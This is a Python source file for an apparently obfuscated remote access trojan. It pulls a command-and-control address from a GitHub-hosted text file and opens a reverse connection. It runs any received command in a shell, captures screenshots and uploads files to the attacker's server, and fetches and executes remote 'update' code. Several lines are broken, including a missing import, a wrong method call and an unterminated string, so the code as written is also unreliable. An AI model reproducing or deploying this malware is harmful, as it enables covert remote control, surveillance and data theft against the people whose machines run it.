import sys,subprocess,socket,time,requests
from PIL import ImageGrab
THGBiXVDGS = "1.29.11.24"
bgYWpjqnptNusYgfTbg = ""
afGEwZhFoBPaTQcUX = ""
YRBhSmrzY = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
HLFGboIglKDUvbbeuiIyYVw = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
cofZyixplSu = "!"

def emXcgTaJKChrRKK(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.emXcgTaJKChrRKK((host, port))
	return s

def BhNziKNfEYfqw(s):
	UtmgvXeNE = s.recv(1024)
	if len(UtmgvXeNE)==0:
		return True
	mIdJHbsyWAVQwvD = UtmgvXeNE.decode("utf-8")
	if not mIdJHbsyWAVQwvD.startswith(cofZyixplSu):
		proc = subprocess.run(UtmgvXeNE.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	EuujFCndiSogTCeOxFcbb = mIdJHbsyWAVQwvD.split(" ")[0][1:]
	if EuujFCndiSogTCeOxFcbb == "download":
		qSeUcFokEkKBeyqyv(s, mIdJHbsyWAVQwvD)
	elif EuujFCndiSogTCeOxFcbb == "screenshot":
		VTNqfxKoUGSaIlep(s)

def qSeUcFokEkKBeyqyv(s, mIdJHbsyWAVQwvD):
	eSAfJfeL = mIdJHbsyWAVQwvD.replace(cofZyixplSu+"screenshot ", "").split(",")
	results = []
	for f in eSAfJfeL:
		results += RMTpvsJczZMvToelaOVV(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))

def VTNqfxKoUGSaIlep(mIdJHbsyWAVQwvD):
	pkrTsCecXp = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	pkrTsCecXp.save(fpath)
	pkrTsCecXp.close()
	r = RMTpvsJczZMvToelaOVV(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)

def RMTpvsJczZMvToelaOVV(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(bgYWpjqnptNusYgfTbg+":"+afGEwZhFoBPaTQcUX+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"

def HGBGGhLZUpVsB():
	if bgYWpjqnptNusYgfTbg == "" or afGEwZhFoBPaTQcUX == "":
		UtmgvXeNE = requests.get(YRBhSmrzY).text.replace("\n","").split(":")
		bgYWpjqnptNusYgfTbg = UtmgvXeNE[0].strip()
		afGEwZhFoBPaTQcUX = UtmgvXeNE[1].strip()
		XQQTdnbovuEsr = UtmgvXeNE[2].strip()
	return bgYWpjqnptNusYgfTbg, afGEwZhFoBPaTQcUX, XQQTdnbovuEsr

def fAwkyhfMSC():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+THGBiXVDGS + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(HLFGboIglKDUvbbeuiIyYVw+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")

def klTVHPcdbB():
	pass

def jCOTruZfXCAGtgTOKgspn():
	h, p, v = HGBGGhLZUpVsB()
	if THGBiXVDGS != v:
		fAwkyhfMSC()
	klTVHPcdbB()
	while True:
		try:
			while True:
				zArNDJrd=False
				try:
					s=emXcgTaJKChrRKK(h, p)
					while not zArNDJrd:
						s.send(b"\n>> ")
						zArNDJrd=BhNziKNfEYfqw(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(jCOTruZfXCAGtgTOKgspn())
